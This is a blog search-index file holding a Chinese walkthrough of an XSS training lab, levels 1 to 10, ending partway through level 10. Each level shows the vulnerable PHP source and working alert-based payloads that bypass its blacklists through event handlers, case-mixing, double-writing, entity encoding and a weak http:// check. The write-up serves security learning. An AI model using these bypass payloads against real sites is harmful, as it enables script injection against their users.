<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>XSS挑战之旅</title>
      <link href="/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/"/>
      <url>/2019/05/20/XSS%E6%8C%91%E6%88%98%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h2 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h2><h3 id="没有任何过滤"><a href="#没有任何过滤" class="headerlink" title="没有任何过滤"></a>没有任何过滤</h3><p>根据提示点击图片</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054268267.png" alt="1558054268267"></p><p>跳转到如下页面</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054405501.png" alt="1558054405501"></p><p>发现url通过get方法传递参数</p><p>修改参数为666</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054498678.png" alt="1558054498678"></p><p>发现在页面中有输出相应内容，可以看出无需闭合双引号，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level1.php?name=&lt;/h2&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;h2&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054637265.png" alt="1558054637265"></p><p>没有任何过滤，成功执行payload</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"name"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;欢迎用户"</span>.$str.<span class="string">"&lt;/h2&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h3 align=center&gt;payload的长度:"</span>.strlen($str).<span class="string">"&lt;/h3&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：没有做任何过滤</p><h2 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h2><h3 id="部分过滤"><a href="#部分过滤" class="headerlink" title="部分过滤"></a>部分过滤</h3><p>输入内容666</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558054961618.png" alt="1558054961618"></p><p>发现有两处输出相应内容的地方，第一处和上一关相同，尝试下同一paylaod</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055118753.png" alt="1558055118753"></p><p>发现<code>&lt;&gt;</code>被实体化转义掉了，这一处无法再进行构造了。</p><p>接下来对另一处进行构造</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055268881.png" alt="1558055268881"></p><p>发现<code>&lt;&gt;</code>没有被转义，构造如下payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055385539.png" alt="1558055385539"></p><p>成功执行payload，便于查看代码，我把alert去掉</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558055539475.png" alt="1558055539475"></p><p>可以看到成功闭合前后标签，所以script标签里的js代码可以成功执行</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level2.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value="搜索"/&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>有两个输出，第一个输出使用htmlspeciachars()进行转义，第二个没有任何过滤，可以在这里进行构造payload。</p><p>两种方法：</p><ol><li><p>不逃逸input标签，闭合引号添加事件触发xss</p><p>鼠标移动至该标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onclick=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>点击输入框</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onfocus=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>等等很多事件，这里贴个网上的链接<a href="https://www.smi1e.top/xss-payload/" target="_blank" rel="noopener">XSS-Payload</a></p></li><li><p>逃逸出input标签,使用其他标签触发xss</p><p><code>&lt;script&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&quot;</span><br></pre></td></tr></table></figure><p><code>&lt;img&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;//</span><br></pre></td></tr></table></figure><p><code>&lt;a&gt;</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;&quot; onmouseover=&quot;alert(1)&quot;&gt;xss&lt;/a&gt;//</span><br></pre></td></tr></table></figure><p>等等</p></li></ol><h2 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h2><h3 id="实体化转义绕过"><a href="#实体化转义绕过" class="headerlink" title="实体化转义绕过"></a>实体化转义绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056793437.png" alt="1558056793437"></p><p>看起来跟level一样，试一下闭合掉value属性</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057130653.png" alt="1558057130653"></p><p>闭合语句虽然没有问题，但是看起来被转义掉了</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558056967968.png" alt="1558056967968"></p><p>双引号被转义，再尝试一下单引号<code>&#39;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;a href=&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057294923.png" alt="1558057294923"></p><p>可以看出来 <code>value=&quot;&quot;</code> 成功闭合，但是 <code>&lt;&gt;</code> 依旧被转义</p><p>再尝试另一种办法，添加事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; onmouseover=&apos;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057537275.png" alt="1558057537275"></p><p>可以看到成功触发事件属性里的js代码</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">"&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level3.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value='"</span>.htmlspecialchars($str).<span class="string">"'&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>两个输出点都做了htmlspecialchars()转义，但是第二个拼接的语句使用了单引号<code>&#39;</code>，而且htmlspecialchars()函数使用默认参数不会对单引号进行转义，所以可以使用单引号闭合前面的属性</p><h2 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h2><h3 id="事件属性逃逸"><a href="#事件属性逃逸" class="headerlink" title="事件属性逃逸"></a>事件属性逃逸</h3><p>跟上关很像，试一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558057712688.png" alt="1558057712688"></p><p>发现<code>&lt;&gt;</code>全部被过滤掉了，那就使用事件属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot; onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p>成功执行payload</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096380758.png" alt="1558096380758"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level4.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第二个输出点对<code>&lt;&gt;</code>进行了替换，使用事件属性进行构造payload</p><h2 id="level5"><a href="#level5" class="headerlink" title="level5"></a>level5</h2><h3 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h3><p>构造如下payload</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558096540426.png" alt="1558096540426"></p><p>发现只有script被和谐了， ~ o(<em>￣▽￣</em>)ブ</p><p>使用非<code>&lt;script&gt;</code>的html标签绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed src=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot;&gt;&lt;a href=&quot;javascript:alert(/xss/)&quot;&gt;xss&lt;/a&gt;//</span><br><span class="line">&quot;&gt;&lt;iframe src=&quot;javascript:alert(1)&quot;&gt;&lt;/iframe&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098248009.png" alt="1558098248009"></p><p>使用触发事件绕过</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558098351438.png" alt="1558098351438"></p><p>发现on被过滤，大小写也不行，暂没有找到不用on的😂</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level5.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str3.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>首先使用strtolower()函数把字符串转换为小写，然后对<code>&lt;script</code>和<code>on</code>进行replace替换，那就用不了事件属性了，只能使用闭合标签的方式</p><h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>script被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100639552.png" alt="1558100639552"></p><p>src被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100187489.png" alt="1558100187489"></p><p>href被过滤</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100233619.png" alt="1558100233619"></p><p>on被过滤，事件属性不行了</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558100422464.png" alt="1558100422464"></p><p>有一点点尬住了，看一下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str2=str_replace(<span class="string">"&lt;script"</span>,<span class="string">"&lt;scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level6.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>没有使用strtolower()函数，可以大小写绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed SRC=javascript:alert(/XSS/);&gt;//</span><br><span class="line">&quot; Onmouseover=&quot;alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558102420262.png" alt="1558102420262"></p><h2 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105060724.png" alt="1558105060724"></p><p>on没了，被替换为空，接着试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105341248.png" alt="1558105341248"></p><p>src和script也没了</p><p>想到了双写，成功绕过</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;&gt;&lt;embed ssrcrc=javasscriptcript:alert(/XSS/);&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105662485.png" alt="1558105662485"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str =strtolower( $_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">""</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">""</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">""</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">""</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">""</span>,$str5);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level7.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.$str6.<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=搜索 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>替换了一系列关键字，但是却替换为空值，所以可以利用双写绕过</p><h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><h3 id="属性值编码绕过"><a href="#属性值编码绕过" class="headerlink" title="属性值编码绕过"></a>属性值编码绕过</h3><p>这关有点不一样了</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558105893509.png" alt="1558105893509"></p><p>试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558106118797.png" alt="1558106118797"></p><p>script和href被替换，再尝试on、src、<code>&quot;</code> 都会被替换，大小写也无法绕过</p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level8.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>第一处有html实体化转义，无法逃脱出来。第二处先转换大小写，然后黑名单过滤特殊字符和双引号；参考别人的文章，发现可以对HTML属性的值进行实体编码绕过</p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558237810579.png" alt="1558237810579"></p><h2 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h2><h3 id="格式验证绕过"><a href="#格式验证绕过" class="headerlink" title="格式验证绕过"></a>格式验证绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248807926.png" alt="1558248807926"></p><p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558248919987.png" alt="1558248919987"></p><p>那就继续构造带 <code>http://</code> 的拼接语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558249256987.png" alt="1558249256987"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250497766.png" alt="1558250497766"></p><p>但是没有提交按钮和提交页面</p><p><img src="/2019/05/20/XSS挑战之旅/XSS挑战之旅.assets/1558250601339.png" alt="1558250601339"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span 